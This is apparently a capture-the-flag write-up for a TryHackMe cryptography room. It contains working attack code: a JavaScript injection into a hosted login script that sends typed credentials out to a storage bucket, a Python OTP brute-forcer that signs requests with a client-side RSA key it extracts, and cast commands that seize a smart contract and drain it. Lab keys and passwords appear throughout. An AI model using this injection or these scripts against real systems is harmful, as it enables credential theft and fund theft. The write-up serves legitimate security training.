# [TryHack3M: TriCipher Summit](https://tryhackme.com/room/tryhack3mencryptionchallenge)

## Reach the apex of this triple-crypto challenge!

# Find the TryHack3M Flags

Step into the realm of TryHackM3 as we approach 3 million users, where '3 is the magic number'! Embark on the TryHackM3 challenge, intercepting credentials, cracking custom crypto, hacking servers, and breaking into smart contracts to steal the 3 million. Are you ready for the cryptography ultimate challenge?

In this challenge, you will be expected to:

- Perform supply chain attacks
- Reverse engineer cryptography
- Hack a crypto smart contract

### What is Flag 1?

1. Enumerate all open ports and running services on the target machine with `nmap`

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 18:17:dd:96:9e:4a:ec:29:f4:8a:ae:a2:d3:a5:d2:1b (RSA)
|   256 f2:6e:be:32:76:7c:2a:a2:6c:6b:39:40:bc:0f:18:d2 (ECDSA)
|_  256 27:2b:d4:90:72:34:d2:8a:1f:dc:2e:d1:e9:08:56:65 (ED25519)
80/tcp   open  http             Python http.server 3.5 - 3.10
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/http         nginx 1.25.4
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.25.4
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=cdn.tryhackm3.loc/organizationName=TryHackMe3/stateOrProvinceName=Trimento/countryName=AU
| Not valid before: 2024-04-03T04:52:12
|_Not valid after:  2025-04-03T04:52:12
5000/tcp open  ssl/http         Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
| ssl-cert: Subject: commonName=*/organizationName=Dummy Certificate
| Subject Alternative Name: DNS:*
| Not valid before: 2026-05-19T19:01:42
|_Not valid after:  2027-05-19T19:01:42
|_ssl-date: TLS randomness does not represent time
8000/tcp open  http             nginx 1.25.4
|_http-title: Site doesn't have a title (application/xml).
|_http-server-header: nginx/1.25.4
9444/tcp open  wso2esb-console?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Content-Type: application/xml
|     cache-control: no-cache, max-age=0
|     last-modified: Tue, 19 May 2026 19:03:35 GMT
|     server: 54f4e1f708c4
|     P3P: CP="This site does not have a p3p policy."
|     vary: origin
|     <?xml version="1.0" encoding="UTF-8"?><ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
|     <hint>Goto: http://null/ui to visit the admin UI</hint>
|     <Owner>
|     <ID>initiatorId</ID>
|     <DisplayName>initiatorName</DisplayName>
|     </Owner>
|     <Buckets>
|     <Bucket>
|     <Name>libraries</Name>
|     <CreationDate>2024-04-05T10:23:05Z</CreationDate>
|     </Bucket>
|     </Buckets>
|     </ListAllMyBucketsResult>
|   HTTPOptions:
|     HTTP/1.1 500 Internal Server Error
|     content-type: text/html; charset=UTF-8
|     last-modified: Tue, 19 May 2026 19:03:36 GMT
|     cache-control: no-cache, max-age=0
|     set-cookie: NINJA_SESSION=539407ceae25a079b082efad29e93dcf068f563a2967a1629319c311e949e328dee4172ecf499fb149958576030df317d464e7a5180dc7cc84df1e5e3ccb2aeb:?previousCSRFToken=&CSRFToken=60dde96c-b78d-44aa-96f0-00086d7b8660&lastCSRFRecompute=1779217416391; Max-Age=7776000; Expires=Mon, 17 Aug 2026 19:03:36 GMT; Path=/; HTTPOnly; SameSite=Lax
|     server: 54f4e1f708c4
|     P3P: CP="This site does not have a p3p policy."
|     vary: origin
|     content-length: 11088
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Error - S3 ninja</title>
|     <link rel="stylesheet"
|     media="screen"
|_    href="
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Add the target IP and discovered hostname to `/etc/hosts` to allow name resolution

```bash
echo <TARGET_IP> cdn.tryhackm3.loc >> /etc/hosts
```

3. Visit `https://cdn.tryhackm3.loc/`. the S3 API responds with an XML listing of all buckets and includes a hint pointing to the admin UI

```xml
<?xml version="1.0" encoding="UTF-8"?><ListAllMyBucketsResult
  xmlns="http://s3.amazonaws.com/doc/2006-03-01/"
>
  <hint>Goto: http://<TARGET_IP>/ui to visit the admin UI</hint>
  <Owner>
    <ID>initiatorId</ID>
    <DisplayName>initiatorName</DisplayName>
  </Owner>
  <Buckets>
    <Bucket>
      <Name>libraries</Name>
      <CreationDate>2024-04-05T10:23:05Z</CreationDate>
    </Bucket>
  </Buckets>
</ListAllMyBucketsResult>
```

4. Visit `https://cdn.tryhackm3.loc/ui`. Navigate to `https://cdn.tryhackm3.loc/ui/libraries`.Two JavaScript objects are stored there: `auth.js` and `form-submit.js`. The `form-submit.js` file is loaded by the login form on port 5000 and is responsible for submitting credentials to the server.

5. This is a **supply chain attack**. Download `form-submit.js`, inject credential-exfiltration code immediately after the `rawdata` variable is constructed, then upload the modified file back to the bucket under the same filename to replace the original. When a user submits the login form, the injected code will POST the plaintext credentials as a new file `creds.txt` to the libraries bucket.

```js
let rawdata =
  "username=" +
  formDataObj["username"] +
  "&password=" +
  formDataObj["password"];

const exfil_creds = await fetch(
  "https://cdn.tryhackm3.loc/ui/libraries?upload&filename=creds.txt",
  {
    method: "POST",
    headers: {
      "Content-Type": "text/plain",
    },
    body: rawdata,
  },
);
```

6. Use the exfiltrated credentials to log in at `https://cdn.tryhackm3.loc:5000/`

7. Open browser developer tools, go to the **Network** tab, and inspect the response body from the POST request to `https://cdn.tryhackm3.loc:5000/login`

8. The response body contains a Base64-encoded message. Decoding it reveals **Flag 1** and a hint to proceed to the new endpoint `/supersecretotp`

<img width="1921" height="575" alt="SCREEN01" src="https://github.com/user-attachments/assets/4d1df97b-d426-42ff-8ac7-4a4dcafc3f2a" />

---

### What is Flag 2?

1. Visit `https://cdn.tryhackm3.loc:5000/supersecretotp`. This page presents a 4-digit OTP input form that must be passed to continue

2. View the page source and locate the reference to `form-submit2.js`. This script exposes the full cryptographic protocol used to transmit the OTP:

```js
const form = document.querySelector("#otp-form");
const privkey = `MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCuL9Yb8xsvKimy
lR/MJB2Z2oBXuIvIidHIVxf7+Sl3Y35sU53Vd+D1QOuJByvpLmpczYsQkUMJmKha
36ibC2gjBMlTlZJ0OwnjG+Na0libW9fnWZVKq0JuAhyJd9OUyO0Up1hk2W6/1abU
OuEcYn1CTdYrTq7pdRhKLp2kYfVo64oV+NPDgQWvaIyR9vdEA+tGa4bgm5BQENaw
0Uh6qrtBh8pFKDX9EMEizauhRAsOUVlZ6ZYWCiT+A+IGZHpzFIXWh0gRbIANDZAd
g+CATLT/jee9wi0Vvg7L4o/Xn293SIAXYK7NYEHwMZP/SSmtcasYSFfgFvZ3BX+j
OLNynG5lAgMBAAECggEABXwFGlEvwG7r7C8M1sEmW3NJSjnJ0PEh9VRksW7ZcuRj
lSaW2CNTpnU6VVCv/cIT4EMqh0WDnlg7qMzVAri7uSqL6kFR4K4BNDDrGi94Ub/1
Dtg/vp+g0lTnsB5hP5SJ/nX8bwR3m7uu6ozGDL4/ImjP/wIVuM0SjDdmiEf7UafX
iWE12Lq5RbsHnvcXte2wl09keRszatRk/ODrqMPxzjS1NSt6KBfxtiRPNB+GZt1y
DhYKaHEO0riDsUiXurMwt7bAlupiiIS0pDAfNDEnvc2gWaiir8pIFGezowd+sIOd
XSW3aJU2Y5ByroelgkovRNIpF2QPXfFSsHyzx5uQawKBgQDsnwAuzp07CaHrXyaJ
HBno149LOaGYzRucxdKFFndizY/Le7ONl4PujRV+dwATAnuo8WIz7Upitd1uuh+H
0n37G4gaKIPK0o/pNYgIpMAoWSRI9zkPyId8yBEcpMJiUYXhXziQHhYhJ3shzn/2
Rh5RDS31tCxykpe5AHATw+R60wKBgQC8c9bPRNakEftP4IkC5wriHXpwEXYWRmCf
rRmeJmfApUgGfnAWzWBu1D5eHZU5z+6iojSSyxZSGJfKedON6loySWww/ZF/1QqQ
xkS+E3S86jp1PeJVYu2DuYhfcb8AXjt4ed48DNEMR5XZeWIKCYLsACHmag1IR9cW
XmCgovO+5wKBgQDJaVp1fUfW3g8m07pwkSv4x6vgg3DrKQPtAXJ9+K6sun9A3M3s
o2EY6Jy4JkE47S8nkjheLQjZVybiPqniKik0Wq4SXhQ4y9zVzMw7V0l9zssVFONM
bQvvCjmOoSwZFn2YZj42ZnW9yOaF00mW7v6VTVumvrPq3p8pSZcdK+zLIwKBgQCm
qiwIEvFhGSYRdpq1nm/Zmgh2pHqzKHq7vPMzEvQfRA128Mtg3zGx0rN1uOQIxQRf
gOTODh4nbOiRgTy//crXPmgYy6iqTVeSwkZ5c+uCSAR7O8e3jE5SePtKreYmBTDD
U8Rfh1Y6bfTw6JD0H4VSAqv4g0JL8n0eo0kByBuZcQKBgGdaG1XJZbK4a1fQ3scR
sv8Z+HgkaKS1FY0nXShNwFaE4Tfk6f/gsTgNqbyhk+HsFelmxKoFgf0Sa7313TPR
ibFr+wDYJVOApLm9P/dg5AecXRylUKv/gbbVwBDnkCWrm48H3MY+uLqVBUZ+2jfi
c7A3LDsSigmnDbODU4muEM0Z`;
const enc = new TextEncoder();

function str2ab(str) {
  const buf = new ArrayBuffer(str.length);
  const bufView = new Uint8Array(buf);
  for (let i = 0, strLen = str.length; i < strLen; i++) {
    bufView[i] = str.charCodeAt(i);
  }
  return buf;
}

function getPrivateKey() {
  const binaryDerString = window.atob(privkey);
  const binaryDer = str2ab(binaryDerString);

  return window.crypto.subtle.importKey(
    "pkcs8",
    binaryDer,
    {
      name: "RSASSA-PKCS1-v1_5",
      hash: "SHA-256",
    },
    true,
    ["sign"],
  );
}

function rot13(message) {
  const originalAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
  return message.replace(
    /[a-z]/gi,
    (letter) => cipher[originalAlpha.indexOf(letter)],
  );
}

async function getSecretKey(key) {
  return await window.crypto.subtle.importKey("raw", key, "AES-CBC", true, [
    "encrypt",
    "decrypt",
  ]);
}

async function encryptMessage(key, message) {
  iv = enc.encode("0000000000000000").buffer;
  return await window.crypto.subtle.encrypt(
    {
      name: "AES-CBC",
      iv,
    },
    key,
    message,
  );
}

async function signMessage(privateKey, message) {
  return await window.crypto.subtle.sign(
    "RSASSA-PKCS1-v1_5",
    privateKey,
    message,
  );
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const formData = new FormData(form);
  const formDataObj = {};
  formData.forEach((value, key) => (formDataObj[key] = value));
  console.log(formDataObj);

  const rawAesKey = window.crypto.getRandomValues(new Uint8Array(16));
  let mac = rot13(window.btoa(String.fromCharCode(...rawAesKey)));
  const aesKey = await getSecretKey(rawAesKey);
  const rsaKey = await getPrivateKey();
  let rawdata = "otp=" + formDataObj["otp"];
  let data = window.btoa(
    String.fromCharCode(
      ...new Uint8Array(
        await encryptMessage(aesKey, enc.encode(rawdata).buffer),
      ),
    ),
  );
  let sign = window.btoa(
    String.fromCharCode(
      ...new Uint8Array(await signMessage(rsaKey, enc.encode(rawdata).buffer)),
    ),
  );

  const response = await fetch("/supersecretotp", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    },
    body:
      "mac=" +
      encodeURIComponent(mac) +
      "&data=" +
      encodeURIComponent(data) +
      "&sign=" +
      encodeURIComponent(sign),
  });
  if (
    response.ok &&
    response.status == 200 &&
    (await response.text()).startsWith("result=")
  ) {
    window.location.href = "/activated";
  } else {
    alert("OTP failed, for more information review the result of the API");
  }
});
```

- A random 16-byte AES key is generated client-side per submission
- The AES key is Base64-encoded then ROT13-encoded to produce the `mac` field
- The OTP payload is AES-CBC encrypted with a **static IV** of `0000000000000000` to produce `data`
- The raw OTP payload is also RSA-signed using the **private key embedded in the script** to produce `sign`
- Because the private key is shipped client-side, we can replicate all signing and encryption server-side

3. Since the private RSA key is embedded in the client-side JavaScript and the AES IV is static, we can replicate every request server-side. The following script brute-forces all 10,000 possible 4-digit OTP values. It reuses a single AES key for all requests and decrypts each response to read the server's verdict:

```py
import requests
import os
from base64 import b64encode, b64decode
from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from urllib.parse import unquote
import urllib3
urllib3.disable_warnings()

LOGIN_URL = "https://cdn.tryhackm3.loc:5000/login"
OTP_URL   = "https://cdn.tryhackm3.loc:5000/supersecretotp"

PRIVATE_KEY_B64 = (
    "MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCuL9Yb8xsvKimylR/MJB2Z2oBX"
    "uIvIidHIVxf7+Sl3Y35sU53Vd+D1QOuJByvpLmpczYsQkUMJmKha36ibC2gjBMlTlZJ0OwnjG+N"
    "a0libW9fnWZVKq0JuAhyJd9OUyO0Up1hk2W6/1abUOuEcYn1CTdYrTq7pdRhKLp2kYfVo64oV+N"
    "PDgQWvaIyR9vdEA+tGa4bgm5BQENaw0Uh6qrtBh8pFKDX9EMEizauhRAsOUVlZ6ZYWCiT+A+IGZ"
    "HpzFIXWh0gRbIANDZAdg+CATLT/jee9wi0Vvg7L4o/Xn293SIAXYK7NYEHwMZP/SSmtcasYSFfg"
    "FvZ3BX+jOLNynG5lAgMBAAECggEABXwFGlEvwG7r7C8M1sEmW3NJSjnJ0PEh9VRksW7ZcuRjlSa"
    "W2CNTpnU6VVCv/cIT4EMqh0WDnlg7qMzVAri7uSqL6kFR4K4BNDDrGi94Ub/1Dtg/vp+g0lTns"
    "B5hP5SJ/nX8bwR3m7uu6ozGDL4/ImjP/wIVuM0SjDdmiEf7UafXiWE12Lq5RbsHnvcXte2wl09k"
    "eRszatRk/ODrqMPxzjS1NSt6KBfxtiRPNB+GZt1yDhYKaHEO0riDsUiXurMwt7bAlupiiIS0pDA"
    "fNDEnvc2gWaiir8pIFGezowd+sIOdXSW3aJU2Y5ByroelgkovRNIpF2QPXfFSsHyzx5uQawKBgQD"
    "snwAuzp07CaHrXyaJHBno149LOaGYzRucxdKFFndizY/Le7ONl4PujRV+dwATAnuo8WIz7Upitd1"
    "uuh+H0n37G4gaKIPK0o/pNYgIpMAoWSRI9zkPyId8yBEcpMJiUYXhXziQHhYhJ3shzn/2Rh5RDS"
    "31tCxykpe5AHATw+R60wKBgQC8c9bPRNakEftP4IkC5wriHXpwEXYWRmCfrRmeJmfApUgGfnAWz"
    "WBu1D5eHZU5z+6iojSSyxZSGJfKedON6loySWww/ZF/1QqQxkS+E3S86jp1PeJVYu2DuYhfcb8A"
    "Xjt4ed48DNEMR5XZeWIKCYLsACHmag1IR9cWXmCgovO+5wKBgQDJaVp1fUfW3g8m07pwkSv4x6v"
    "gg3DrKQPtAXJ9+K6sun9A3M3so2EY6Jy4JkE47S8nkjheLQjZVybiPqniKik0Wq4SXhQ4y9zVzM"
    "w7V0l9zssVFONMbQvvCjmOoSwZFn2YZj42ZnW9yOaF00mW7v6VTVumvrPq3p8pSZcdK+zLIwKBg"
    "QCmqiwIEvFhGSYRdpq1nm/Zmgh2pHqzKHq7vPMzEvQfRA128Mtg3zGx0rN1uOQIxQRfgOTODh4n"
    "bOiRgTy//crXPmgYy6iqTVeSwkZ5c+uCSAR7O8e3jE5SePtKreYmBTDDU8Rfh1Y6bfTw6JD0H4V"
    "SAqv4g0JL8n0eo0kByBuZcQKBgGdaG1XJZbK4a1fQ3scRsv8Z+HgkaKS1FY0nXShNwFaE4Tfk6f"
    "/gsTgNqbyhk+HsFelmxKoFgf0Sa7313TPRibFr+wDYJVOApLm9P/dg5AecXRylUKv/gbbVwBDnkC"
    "Wrm48H3MY+uLqVBUZ+2jfic7A3LDsSigmnDbODU4muEM0Z"
)

IV = b"0000000000000000"

def rot13(text):
    result = []
    for char in text:
        if char.isalpha():
            base = ord('a') if char.islower() else ord('A')
            result.append(chr((ord(char) - base + 13) % 26 + base))
        else:
            result.append(char)
    return ''.join(result)

def generate_mac(key):
    return rot13(b64encode(key).decode())

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))

def decrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(data), AES.block_size)

def generate_sign(rawdata):
    private_key = RSA.import_key(b64decode(PRIVATE_KEY_B64))
    h = SHA256.new(rawdata.encode('utf-8'))
    return PKCS1_v1_5.new(private_key).sign(h)

AES_KEY = os.urandom(16)
mac = generate_mac(AES_KEY)

session = requests.Session()
session.post(LOGIN_URL, data="username=TryHackM3&password=supersecretpassword",
             headers={"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"},
             verify=False)

for i in range(10000):
    otp = str(i).zfill(4)
    rawdata = "otp=" + otp
    data = b64encode(encrypt(rawdata, AES_KEY))
    sign = b64encode(generate_sign(rawdata))
    payload = {"data": data, "mac": mac, "sign": sign}

    r = session.post(OTP_URL, data=payload, verify=False)

    enc_result = b64decode(unquote(r.text.split("=", 1)[1].strip()))
    result = decrypt(enc_result, AES_KEY).decode()
    print(f"{otp}: {result}")
```

4. Once the correct OTP is identified from the output, replace the brute-force loop with a single targeted request using the found code. The server returns an encrypted response that decrypts to **Flag 2** and a hint to visit port `3000`:

```py
AES_KEY = os.urandom(16)
mac = generate_mac(AES_KEY)

otp = "****"
rawdata = "otp=" + otp
data = b64encode(encrypt(rawdata, AES_KEY))
sign = b64encode(generate_sign(rawdata))
payload = {"data": data, "mac": mac, "sign": sign}
r = requests.post(OTP_URL, data=payload, verify=False)
result = unquote(r.text.split("=")[1].rstrip())
result = decrypt(b64decode(result), AES_KEY).decode()
print(result)
```

<img width="1011" height="74" alt="SCREEN02" src="https://github.com/user-attachments/assets/707af972-bf2e-4ad8-be3f-129db3aba358" />

---

### What is Flag 3?

1. Visit `http://cdn.tryhackm3.loc:3000/`. This is a DApp front-end for a private Ethereum blockchain. The page displays the smart contract address, your assigned Ethereum account address, and the corresponding private key required to sign transactions.

2. Add `geth` to `/etc/hosts`

3. Use `cast` to query the current owner of the smart contract. The contract only allows its owner to call `transferDeposit()`, so we need to check who that is:

```bash
cast call --rpc-url http://geth:8545 0xf22cB0Ca047e88AC996c17683Cee290518093574 'owner()'
```

4. Call `reset(address)` on the contract to overwrite the owner field with our own address. This is possible because the `reset` function has no access control. We sign the transaction with our private key:

```bash
cast send --legacy --rpc-url http://geth:8545 --private-key 0x1f262f519f001ca7fc1a5adca45feeaea95033a705336d86ad87c6f750957ea6 0xf22cB0Ca047e88AC996c17683Cee290518093574 'reset(address)' 0x66db027c0dD04058967BB30973ff4DdcB350D6fa
```

**Results:**

```
blockHash            0x55ecc30bfeb1d887865e10f0e82d91d5ce625300af25f8e762764d1a70de8d20
blockNumber          3
contractAddress
cumulativeGasUsed    27603
effectiveGasPrice    1000000000
from                 0x66db027c0dD04058967BB30973ff4DdcB350D6fa
gasUsed              27603
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status               1 (success)
transactionHash      0x629ea6bd9b5f2656513afa2f48cc1b596490aa8a239234ed3a8abd0ef831f1e2
transactionIndex     0
type                 0
blobGasPrice
blobGasUsed
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574
```

5. Now that we own the contract, call `transferDeposit()` to drain the deposited balance and trigger the completion condition:

```bash
cast send --legacy --rpc-url http://geth:8545 --private-key 0x1f262f519f001ca7fc1a5adca45feeaea95033a705336d86ad87c6f750957ea6  0xf22cB0Ca047e88AC996c17683Cee290518093574 'transferDeposit()'
```

6. Go back to h`ttp://cdn.tryhackm3.loc:3000/` and click get flag button to displays **Flag 3**

<img width="1237" height="765" alt="SCREEN03" src="https://github.com/user-attachments/assets/8180979f-978a-415b-9201-ce68e4b6a209" />
